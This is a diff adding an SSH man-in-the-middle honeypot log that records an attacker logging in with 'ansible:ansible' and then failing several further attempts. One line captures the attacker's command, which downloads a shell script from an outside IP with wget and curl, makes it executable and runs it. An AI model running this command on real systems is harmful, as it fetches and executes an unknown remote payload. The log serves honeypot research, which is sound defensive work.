@@ -1,0 +1,26 @@
+2020-10-28 11:07:55.744 - [Info] MITM Version: 1.26
+2020-10-28 11:07:55.750 - [Info] Auto Access Enabled: true
+2020-10-28 11:07:55.751 - [Debug] [Init] Auto Access Barrier: true
+2020-10-28 11:07:55.772 - [Info] SSH man-in-the-middle server for 172.20.0.203 listening on 0.0.0.0:10002
+2020-10-28 11:08:13.703 - [Debug] [Connection] Attacker connected: 104.237.233.111 | Client Identification: SSH-2.0-libssh2_1.4.3
+2020-10-28 11:08:14.405 - [Debug] [Auth] Attacker 104.237.233.111 trying to authenticate with "password"
+2020-10-28 11:08:14.406 - [Debug] [Auto Access] Attacker: 104.237.233.111, Threshold: 1, Attempts: 1
+2020-10-28 11:08:14.406 - [Debug] [Auto Access] Compromising the honeypot
+2020-10-28 11:08:14.406 - [Debug] [Auto Access] Adding the following credentials: "ansible:ansible"
+2020-10-28 11:08:14.886 - [Debug] [Auth] Valid credentials - Password Authentication
+2020-10-28 11:08:14.887 - [Debug] [LXC] Attempting to connect to the honeypot: 172.20.0.203
+2020-10-28 11:08:14.986 - [Debug] [LXC-Auth] Attacker authenticated and is inside container
+2020-10-28 11:08:15.160 - [Debug] [EXEC] Noninteractive mode attacker command: wget http://45.145.185.25/wash.sh; curl -O http://45.145.185.25/wash.sh; chmod 777 wash.sh; sh wash.sh
+2020-10-28 11:10:11.060 - [Debug] [Connection] Attacker connected: 104.237.233.111 | Client Identification: SSH-2.0-libssh2_1.4.3
+2020-10-28 11:10:12.303 - [Debug] [Auth] Attacker 104.237.233.111 trying to authenticate with "password"
+2020-10-28 11:10:12.304 - [Debug] [Auth] Attacker authentication error: Invalid credentials - Password Authentication Failure
+2020-10-28 11:10:12.305 - [Debug] [Auth] Attacker: 104.237.233.111 has so far made 1 attempts. Remaining: 5 attempts
+2020-10-28 11:10:12.391 - [Debug] [Connection] Attacker closed the connection
+2020-10-28 11:10:18.247 - [Debug] [Connection] Attacker connected: 104.237.233.111 | Client Identification: SSH-2.0-libssh2_1.4.3
+2020-10-28 11:10:19.192 - [Debug] [Auth] Attacker 104.237.233.111 trying to authenticate with "password"
+2020-10-28 11:10:19.193 - [Debug] [Auth] Attacker authentication error: Invalid credentials - User does not exist
+2020-10-28 11:10:19.193 - [Debug] [Auth] Attacker: 104.237.233.111 has so far made 1 attempts. Remaining: 5 attempts
+2020-10-28 11:10:19.240 - [Debug] [Connection] Attacker closed the connection
+2020-10-28 11:11:24.457 - [Debug] [Connection] Attacker closed connection
+2020-10-28 11:11:24.465 - [Debug] [LXC] Container's OpenSSH server ended connection
+2020-10-28 11:11:24.466 - [Debug] [LXC] Container's OpenSSH server closed connection
